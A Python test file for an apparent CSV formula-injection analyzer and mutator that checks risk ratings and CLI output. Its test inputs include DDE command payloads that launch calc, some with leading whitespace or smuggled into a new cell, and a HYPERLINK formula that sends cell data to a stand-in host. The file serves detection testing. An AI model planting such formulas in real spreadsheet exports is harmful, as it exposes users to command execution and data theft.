import json

from xyainjex import Context, analyze_csv, mutate_csv
from xyainjex.cli import main
from xyainjex.csv.context import analyze_csv_context

CELL = "name,{INPUT},email"
WHOLE = "{INPUT}"
MID = "prefix-{INPUT}"


# --- context ---


def test_cell_context_after_delimiter():
    assert analyze_csv_context(CELL) == Context.CSV_CELL


def test_cell_context_whole():
    assert analyze_csv_context(WHOLE) == Context.CSV_CELL


def test_midcell_context():
    assert analyze_csv_context(MID) == Context.CSV_MIDCELL


# --- breakout ---


def test_benign_cell():
    r = analyze_csv(CELL, "John")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


def test_dde_command_is_critical():
    r = analyze_csv(CELL, "=cmd|'/C calc'!A1")
    assert r.breakout.command_injected
    assert "dangerous" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_plain_formula_is_high():
    r = analyze_csv(CELL, "=1+1")
    assert r.breakout.command_injected
    assert r.risk.value == "HIGH"


def test_hyperlink_exfil_is_critical():
    r = analyze_csv(CELL, '=HYPERLINK("https://evil?d="&A1,"x")')
    assert r.risk.value == "CRITICAL"


def test_at_trigger():
    r = analyze_csv(CELL, "@SUM(1)")
    assert r.breakout.command_injected


def test_leading_whitespace_then_trigger():
    r = analyze_csv(CELL, " \t=cmd|'/C calc'!A1")
    assert r.breakout.command_injected
    assert r.risk.value == "CRITICAL"


def test_midcell_formula_char_does_not_trigger():
    # A formula char mid-cell does not start a cell, so it is not evaluated.
    r = analyze_csv(MID, "=cmd|calc")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


def test_midcell_new_cell_injection():
    r = analyze_csv(MID, ",=cmd|'/C calc'!A1")
    assert r.breakout.command_injected
    assert r.risk.value == "CRITICAL"


def test_benign_midcell():
    r = analyze_csv(MID, "safe value")
    assert not r.breakout.command_injected


# --- mutation ---


def test_mutate_cell():
    result = mutate_csv(CELL)
    assert result.context == Context.CSV_CELL
    assert result.valid > 0


def test_mutate_midcell():
    result = mutate_csv(MID)
    assert result.context == Context.CSV_MIDCELL
    assert result.valid > 0


# --- result shape and CLI ---


def test_result_dialect_is_null():
    data = analyze_csv(CELL, "=1+1").to_dict()
    assert data["dialect"] is None
    assert data["context"] == "csv_cell"


def test_cli_csv_json(capsys):
    code = main(["--lang", "csv", "--json", CELL, "=cmd|'/C calc'!A1"])
    data = json.loads(capsys.readouterr().out)
    assert data["risk"] == "CRITICAL"
    assert data["dialect"] is None
    assert code == 2


def test_cli_csv_mutate(capsys):
    code = main(["-l", "csv", "--mutate", CELL])
    out = capsys.readouterr().out
    assert code == 0
    assert "High probability payloads" in out
